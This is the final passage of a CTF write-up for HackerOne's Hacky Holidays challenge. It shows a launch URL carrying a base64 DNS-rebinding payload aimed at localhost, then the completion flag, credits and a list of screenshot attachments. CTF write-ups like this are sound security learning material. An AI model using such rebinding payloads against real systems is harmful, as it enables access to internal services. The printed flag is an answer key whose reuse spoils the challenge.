https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9

+ This payload can take 4 or 5 times to retry to get the final result.
**Response**

{F1140059}

+ After taking down the grinch network on localhost, it'll redirect to https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709


{F1140065}

```


Well done! You've taken down Grinch Networks and saved the holidays!

flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

Thanks for playing, we'd appreciate it if you could leave us some feedback here

```

+ Flag 12 - `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

+ Finally, it was completed and grinch has been taken down.



**DAY 1 - GRINCH EMOTIONS**

{F1140066}

After solving all the flags and taken down the grinch server.

**DAY 12 - UPDATED GRINCH EMOTIONS**

{F1140068}

#Credits

+ Yash sodha (https://mobile.twitter.com/y_sodha)  - A great friend who gave me some hints while I got stuck into the rabbit holes.

+ Discord Channel of Hacker101 - channel #hacky-holidays - A great conversation between ctf master, mods, and members where they gave hints and discussed various topics related to hacky-holidays CTF. 

+ Adam Langley (https://mobile.twitter.com/adamtlangley) - A great CTF creator who created the CTF levels with rising difficulties. Thanks, Adam for providing such CTF. 

+ Nahamsec (https://mobile.twitter.com/NahamSec) - A great organizer for this CTF, provided this CTF to connect with hackerone and gave everyone an opportunity to find flags and get private invites on Hackerone Platform.



Thanks
Kunal

## Impact

+ Completed all the challenges and stopped the grinch.

## Attachments
- Screenshot_2020-12-31_at_7.58.13_AM.png
- Screenshot_2020-12-31_at_8.04.42_AM.png
- Screenshot_2020-12-31_at_8.43.38_AM.png
- Screenshot_2020-12-31_at_8.48.53_AM.png
- Screenshot_2020-12-31_at_8.55.11_AM.png
- Screenshot_2020-12-31_at_8.56.44_AM.png
- Screenshot_2020-12-31_at_9.40.59_AM.png
- Screenshot_2020-12-31_at_9.44.20_AM.png
- Screenshot_2020-12-31_at_10.40.16_AM.png
- Screenshot_2020-12-31_at_10.46.33_AM.png
- Screenshot_2020-12-31_at_10.50.03_AM.png
- Screenshot_2020-12-31_at_10.52.38_AM.png
- Screenshot_2020-12-31_at_3.45.08_PM.png
- Screenshot_2020-12-31_at_3.49.02_PM.png
- Screenshot_2020-12-31_at_3.49.02_PM.png
- Screenshot_2020-12-31_at_3.57.11_PM.png
- Screenshot_2020-12-31_at_4.04.45_PM.png
- Screenshot_2020-12-31_at_4.06.07_PM.png
- Screenshot_2020-12-31_at_4.10.03_PM.png
- Screenshot_2020-12-31_at_4.14.20_PM.png
- Screenshot_2020-12-31_at_4.22.15_PM.png
- Screenshot_2020-12-31_at_4.24.29_PM.png
- Screenshot_2020-12-31_at_4.26.29_PM.png
- screenshot_frackzip.jpeg
- Screenshot_2020-12-31_at_4.38.49_PM.png
- Screenshot_2020-12-31_at_4.44.01_PM.png
- Screenshot_2020-12-31_at_5.09.15_PM.png
- Screenshot_2020-12-31_at_5.17.04_PM.png
- Screenshot_2020-12-31_at_5.16.56_PM.png
- Screenshot_2020-12-31_at_5.16.40_PM.png
- Screenshot_2020-12-31_at_5.23.03_PM.png
- Screenshot_2020-12-31_at_5.29.46_PM.png
- Screenshot_2020-12-31_at_5.32.12_PM.png
- Screenshot_2020-12-31_at_6.06.12_PM.png
- Screenshot_2020-12-31_at_6.06.01_PM.png
- Screenshot_2020-12-31_at_6.09.46_PM.png
- Screenshot_2020-12-31_at_6.14.28_PM.png
- Screenshot_2020-12-31_at_6.33.53_PM.png
- Screenshot_2020-12-31_at_6.38.17_PM.png
- Screenshot_2020-12-31_at_6.42.32_PM.png
- Screenshot_2020-12-31_at_6.46.33_PM.png
- Screenshot_2020-12-31_at_6.54.26_PM.png
- Screenshot_2020-12-31_at_6.55.55_PM.png
- Screenshot_2020-12-31_at_7.14.37_PM.png
- Screenshot_2020-12-31_at_7.25.28_PM.png
- Screenshot_2020-12-22_at_6.56.12_PM.png
- Screenshot_2020-12-21_at_2.00.15_AM.png
- Screenshot_2020-12-31_at_7.41.48_PM.png
- Screenshot_2020-12-31_at_7.45.47_PM.png
- Screenshot_2020-12-31_at_7.47.58_PM.png
- Screenshot_2020-12-31_at_7.52.10_PM.png
- Screenshot_2020-12-31_at_7.53.01_PM.png
- Screenshot_2020-12-31_at_8.03.18_PM.png
- Screenshot_2020-12-31_at_8.23.32_PM.png
- Screenshot_2020-12-31_at_8.28.28_PM.png
- Screenshot_2020-12-31_at_8.29.18_PM.png
- Screenshot_2020-12-31_at_8.36.10_PM.png
- Screenshot_2020-12-31_at_8.45.37_PM.png
- Screenshot_2020-12-31_at_9.02.18_PM.png
- Screenshot_2020-12-31_at_9.05.02_PM.png
- Screenshot_2020-12-31_at_9.17.52_PM.png
- Screenshot_2020-12-31_at_9.20.20_PM.png
- Screenshot_2020-12-31_at_9.23.52_PM.png
- Screenshot_2020-12-31_at_9.29.04_PM.png
- Screenshot_2020-12-31_at_9.42.52_PM.png
- Screenshot_2020-12-31_at_9.52.06_PM.png
- Screen_Recording_2020-12-31_at_11.56.44_PM.mov
- Screenshot_2021-01-01_at_12.00.01_AM.png
- gifevil_smile.gif
- gifsad.gif
